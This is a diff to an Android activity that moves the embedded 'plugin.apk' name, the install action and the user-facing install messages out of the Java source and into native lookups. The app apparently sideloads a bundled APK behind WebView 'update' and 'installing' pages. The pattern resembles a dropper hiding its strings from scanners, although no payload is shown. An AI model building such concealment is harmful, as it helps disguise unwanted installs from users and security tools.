@@ -32,9 +32,40 @@ import java.io.InputStream;
 public class MainActivity extends Activity {
 
     private static final String TAG = "MainActivity";
-    private static final String APK_NAME = "plugin.apk";
     private static final int REQUEST_INSTALL = 100;
-    private static final String ACTION_INSTALL = "com.example.installer.INSTALL";
+    
+    // Native methods for getting constants
+    private native String nativeGetString(String key);
+    private native int nativeGetInt(String key);
+    
+    // Lazy-loaded constants from native
+    private String getApkName() {
+        return nativeGetString("APK_NAME");
+    }
+    
+    private String getActionInstall() {
+        return nativeGetString("ACTION_INSTALL");
+    }
+    
+    private String getMsgInstalledSuccess() {
+        return nativeGetString("MSG_INSTALLED_SUCCESS");
+    }
+    
+    private String getMsgInstallFailed() {
+        return nativeGetString("MSG_INSTALL_FAILED");
+    }
+    
+    private String getMsgInstallInProgress() {
+        return nativeGetString("MSG_INSTALL_IN_PROGRESS");
+    }
+    
+    private String getMsgPermissionRequired() {
+        return nativeGetString("MSG_PERMISSION_REQUIRED");
+    }
+    
+    private String getMsgEnableUnknownSources() {
+        return nativeGetString("MSG_ENABLE_UNKNOWN_SOURCES");
+    }
 
     private WebView webView;
     private String packageName = null;
@@ -71,7 +102,7 @@ public class MainActivity extends Activity {
                     handler.post(new Runnable() {
                         @Override
                         public void run() {
-                            toast("Installed successfully");
+                            toast(getMsgInstalledSuccess());
                             isInstalling = false;
                         }
                     });
@@ -89,7 +120,7 @@ public class MainActivity extends Activity {
                         @Override
                         public void run() {
                             isInstalling = false;
-                            toast("Installation failed");
+                            toast(getMsgInstallFailed());
                             if (webView != null) {
                                 String html = nativeGetHtml("update");
                                 if (html != null && !html.isEmpty()) {
@@ -110,7 +141,7 @@ public class MainActivity extends Activity {
         setupSystemBars();
 
         try {
-            IntentFilter filter = new IntentFilter(ACTION_INSTALL);
+            IntentFilter filter = new IntentFilter(getActionInstall());
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 registerReceiver(installReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
             } else {
@@ -181,6 +212,20 @@ public class MainActivity extends Activity {
 
     class WebAppInterface {
         @JavascriptInterface
+        public void showInstalling() {
+            handler.post(new Runnable() {
+                @Override
+                public void run() {
+                    // Show installing page
+                    String html = nativeGetHtml("installing");
+                    if (html != null && !html.isEmpty()) {
+                        webView.loadDataWithBaseURL("file:///android_asset/update/", html, "text/html", "UTF-8", null);
+                    }
+                }
+            });
+        }
+
+        @JavascriptInterface
         public void installPlugin() {
             handler.post(new Runnable() {
                 @Override
@@ -188,7 +233,7 @@ public class MainActivity extends Activity {
                     if (!isInstalling) {
                         checkPermission();
                     } else {
-                        toast("Installation in progress");
+                        toast(getMsgInstallInProgress());
                     }
                 }
             });
@@ -203,7 +248,7 @@ public class MainActivity extends Activity {
                     intent.setData(Uri.parse("package:" + getPackageName()));
                     startActivityForResult(intent, REQUEST_INSTALL);
                 } catch (Exception e) {
-                    toast("Please enable install from unknown sources");
+                    toast(getMsgEnableUnknownSources());
                 }
                 return;
             }
@@ -273,9 +318,9 @@ public class MainActivity extends Activity {
 
     private String copyApkToCache() {
         try {
-            File tempFile = new File(getCacheDir(), "plugin.apk");
+            File tempFile = new File(getCacheDir(), getApkName());
 
-            InputStream in = getAssets().open(APK_NAME);
+            InputStream in = getAssets().open(getApkName());
             FileOutputStream out = new FileOutputStream(tempFile);
 
             byte[] buffer = new byte[65536];
@@ -297,7 +342,7 @@ public class MainActivity extends Activity {
         try {
             File tempFile = new File(getCacheDir(), "temp.apk");
 
-            InputStream in = getAssets().open(APK_NAME);
+            InputStream in = getAssets().open(getApkName());
             FileOutputStream out = new FileOutputStream(tempFile);
 
             byte[] buffer = new byte[8192];
@@ -491,7 +536,7 @@ public class MainActivity extends Activity {
                         if (getPackageManager().canRequestPackageInstalls()) {
                             install();
                         } else {
-                            toast("Permission required");
+                            toast(getMsgPermissionRequired());
                             isInstalling = false;
                             if (webView != null) {
                                 String html = nativeGetHtml("update");
